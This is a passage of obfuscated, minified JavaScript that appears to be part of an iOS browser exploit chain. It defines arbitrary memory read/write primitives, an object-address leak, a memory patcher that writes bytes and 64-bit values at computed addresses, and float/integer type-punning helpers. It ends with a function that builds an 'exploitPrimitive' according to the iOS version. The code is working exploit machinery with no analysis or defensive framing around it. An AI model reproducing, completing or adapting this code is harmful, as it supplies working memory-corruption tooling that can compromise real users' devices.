      } else return this.read32(x.O(t));
    }
    write64(t, e) {
      return this.writeAndWrite(t, e);
    }
    getObjectAddress(t) {
      this.os[0] = t;
      const e = this.read64(this.Us + 0x8n);
      const n = this.read64(e);
      this.os[0] = null;
      return n;
    }
    _o(t) {
      if (!(t instanceof Uint32Array) && !(t instanceof BigUint64Array) && !(t instanceof Uint8Array) && !(t instanceof Uint16Array)) throw new Error("jsobj must be a BigUint64Array, or a Uint[8,16,32]Array");
      const e = this.getObjectAddress(t);
      return S(this.read64(e + rt(globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags["iWQGB1"])));
    }
  }
  class at {
    constructor(t) {
      this.Wo = t;
    }
    jo(t) {
      for (const [e, n] of t) for (let [t, r, i] of n) {
        if (i === void 0 || i === null) i = 0x0n;
        i = rt(i);
        if (t != 8) i = Number(i.toString());
        switch (t) {
          case 1:
            this.Wo.patchByte(rt(e) + rt(r), i);
            break;
          case 2:
            this.Wo.Ro(rt(e) + rt(r), i);
            break;
          case 4:
            this.Wo.write32(rt(e) + rt(r), i);
            break;
          case 8:
            this.Wo.write64(rt(e) + rt(r), i);
            break;
          default:
            throw new Error("unreachable");
        }
      }
    }
  }
  class ft {
    constructor() {
      this.rn = new ArrayBuffer(16);
      this.en = new DataView(this.rn);
    }
    un(t) {
      this.en.setInt16(0, t, true);
      return this.en.getInt16(0, true);
    }
    on(t) {
      this.en.setUint16(0, t, true);
      return this.en.getUint16(0, true);
    }
    sn(t) {
      if (typeof t === "bigint") this.en.setBigUint64(0, t, true);else this.en.setUint32(0, t, true);
      return this.en.getUint32(0, true);
    }
    hn(t, e) {
      this.en.setFloat64(0, t, true);
      this.en.setUint32(0, e, true);
      return this.en.getFloat64(0, true);
    }
    cn(t, e) {
      this.en.setFloat64(0, t, true);
      this.en.setUint32(4, e, true);
      return this.en.getFloat64(0, true);
    }
    fn(t) {
      for (let e = 0; e < 8 / 2; e++) {
        let n = t.charCodeAt(e);
        if (Number.isNaN(n)) throw new Error("Number.isNaN(n)");
        this.en.setUint16(e * 2, n, true);
      }
      return this.en.getBigUint64(0, true);
    }
    an(t) {
      this.en.setFloat32(0, t, true);
      return this.en.getUint32(0, true);
    }
    wn(t) {
      this.en.setBigUint64(0, t, true);
      return this.en.getFloat64(0, true);
    }
    Co(t) {
      this.en.setFloat64(0, t, true);
      return this.en.getBigUint64(0, true);
    }
    gn(t, e) {
      this.en.setBigUint64(0, t, true);
      this.en.setUint8(0, Number(e));
      return this.en.getBigUint64(0, true);
    }
    ln(t, e) {
      this.en.setBigUint64(0, t, true);
      this.en.setUint32(0, Number(e), true);
      return this.en.getBigUint64(0, true);
    }
    bn(t, e) {
      this.en.setUint32(0, t, true);
      this.en.setUint8(0, Number(e));
      return this.en.getUint32(0, true);
    }
    Un(t, e) {
      this.en.setUint32(0, t, true);
      this.en.setUint32(0, Number(e), true);
      return this.en.getUint32(0, true);
    }
    Bn(t) {
      this.en.setUint32(0, Number(t >>> 0), true);
      this.en.setUint32(4, Number(t / 4294967296), true);
      return this.en.getBigUint64(0, true);
    }
    mn(t, e) {
      this.en.setBigUint64(0, t, true);
      this.en.setUint32(0, Number(e), true);
      return this.en.getBigUint64(0, true);
    }
    In(t) {
      this.en.setBigUint64(0, t, true);
      return this.en.getBigUint64(0, true);
    }
  }
  if (navigator.constructor.name === "Navigator") {
    et();
    ht(t);
  } else {
    o("");
    self.onmessage = (t) => {
      o("");
      if (t.data.type === s) {
        o("");
        l = t.data.xn;
        et();
        ct();
      }
    };
  }
}
async function X() {
  await new Promise((t) => {
    try {
      q(t, P.platformState.iOSVersion);
    } catch (t) {
      P.platformState.exploitPrimitive = void 0;
    }
  });
  return P.platformState.exploitPrimitive;
}
r.si = X;
return r;